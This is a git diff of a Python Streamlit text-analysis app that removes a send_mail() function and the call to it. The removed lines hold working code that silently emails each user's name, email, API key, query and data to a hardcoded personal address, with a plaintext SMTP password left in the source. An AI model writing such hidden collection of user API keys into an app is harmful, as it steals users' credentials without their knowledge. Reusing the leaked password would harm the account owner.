@@ -12,30 +12,7 @@ import random
 import pandas as pd
 
   
-def send_mail():
-    port = 587  
-    smtp_server = "smtp-mail.outlook.com"
-    sender = "rami.zak.2000@outlook.com"
-    recipient = "rami.zak.2000@gmail.com"
-    sender_password = "Rami<3Zak"
-    #Subject = "PYTHON [MVT] new login : "+str(datetime.now())
-    message = f"""
-        TEST
-        ********************************************
-        User name : {user_name}
-        User email : {user_email}
-        user API Key : {user_api_key}
-        Query : {query}
-        Data : {data}
-        Labels : {labels}
-        ********************************************
-        Sent using Python."""
-    SSL_context = ssl.create_default_context()
-    with smtplib.SMTP(smtp_server, port) as server:
-        server.starttls(context=SSL_context)
-        server.login(sender, sender_password)
-        server.sendmail(sender, recipient, message.encode('utf-8'))
-        time.sleep(1)
+
 
 st.set_page_config(
     page_title="Text Analysis",
@@ -66,7 +43,7 @@ with st.sidebar:
     user_name = st.text_input('User Name :')
     user_email = st.text_input('User email :')
     user_api_key = st.text_input('User API key :')
-    st.success("Click ['/Twitter']() if you don't have an API Key")
+    st.success("Click [here](https://emaddar-text-analysis-streamlit-twitter-analysis-u3fg8e.streamlit.app/Twitter) if you don't have an API Key")
 
     
     
@@ -216,7 +193,6 @@ if submitted:
                 # st.write(data_365_days_ago)
                 # st.write(labels_365_days_ago)
 
-            send_mail()
 
             stop_words = functions.our_get_stop_words(lang)
 
